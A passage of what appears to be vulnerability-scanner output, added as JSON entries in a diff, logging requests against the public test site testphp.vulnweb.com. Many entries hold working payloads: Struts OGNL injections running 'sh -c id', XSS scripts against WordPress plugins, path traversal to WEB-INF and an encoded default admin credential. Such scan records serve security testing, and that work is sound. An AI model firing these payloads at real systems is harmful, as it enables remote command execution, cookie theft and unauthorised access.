+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.action?p=valid&p=valid&pp=12&pp=12&redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/login.action?pp=12&pp=12&redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.action?pp=12&pp=12&action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.action?pp=12&pp=12&redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/login.action?p=valid&p=valid&pp=12&pp=12&redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.action?pp=12&pp=12&action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.action?pp=12&pp=12&redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.action?p=valid&p=valid&pp=12&pp=12&redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/login.action?pp=12&pp=12&action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.action?p=valid&p=valid&pp=12&pp=12&action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/login.action?p=valid&p=valid&pp=12&pp=12&action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/login.action?p=valid&p=valid&pp=12&pp=12&redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.action?p=valid&p=valid&pp=12&pp=12&action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/login.action?pp=12&pp=12&redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.action?p=valid&p=valid&pp=12&pp=12&redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.action?pp=12&pp=12&redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.action?p=valid&p=valid&pp=12&pp=12&redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.action?pp=12&pp=12&redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/uploader/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/uploader/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/uploader/views/notify.php?pp=12&notify=unnotif&blog=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/uploader/views/notify.php?p=valid&pp=12&notify=unnotif&blog=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/trafficanalyzer/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/trafficanalyzer/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?p=valid&pp=12&aoid=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?pp=12&aoid=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp//faces/javax.faces.resource/web.xml?pp=12&loc=../WEB-INF",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/costModule/faces/javax.faces.resource/web.xml?p=valid&pp=12&loc=../WEB-INF",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/category-grid-view-gallery/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/category-grid-view-gallery/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php?p=valid&pp=12&ID=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php?pp=12&ID=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/duplicator/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/duplicator/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/duplicator/files/installer.cleanup.php?pp=12&remove=1&package=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/duplicator/files/installer.cleanup.php?p=valid&pp=12&remove=1&package=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/cgi-bin/nobody/VerifyCode.cgi?pp=12&account=YWRtaW46bGludXgzMjE=&login=quick",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/cgi-bin/nobody/VerifyCode.cgi?p=valid&pp=12&account=YWRtaW46bGludXgzMjE=&login=quick",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?p=valid&p=valid&pp=12&pp=12&page=%3Cscript%3Ealert(document.domain)%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?pp=12&pp=12&page=%3Cscript%3Ealert(document.domain)%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&dlsearch=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&q=node&destination=node",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/?p=valid&pp=12&q=node&destination=node",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/activehelper-livehelp/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/activehelper-livehelp/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/activehelper-livehelp/server/offline.php?pp=12&MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/import-legacy-media/getid3/demos/demo.mimeonly.php?pp=12&filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/import-legacy-media/getid3/demos/demo.mimeonly.php?p=valid&pp=12&filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/infusionsoft/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/infusionsoft/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/infusionsoft/Infusionsoft/tests/notAuto_test_ContactService_pauseCampaign.php?p=valid&pp=12&go=go%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&contactId=contactId%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&campaignId=campaignId%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/infusionsoft/Infusionsoft/tests/notAuto_test_ContactService_pauseCampaign.php?pp=12&go=go%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&contactId=contactId%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&campaignId=campaignId%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/movies/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/movies/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/movies/getid3/demos/demo.mimeonly.php?pp=12&filename=filename%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/movies/getid3/demos/demo.mimeonly.php?p=valid&pp=12&filename=filename%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
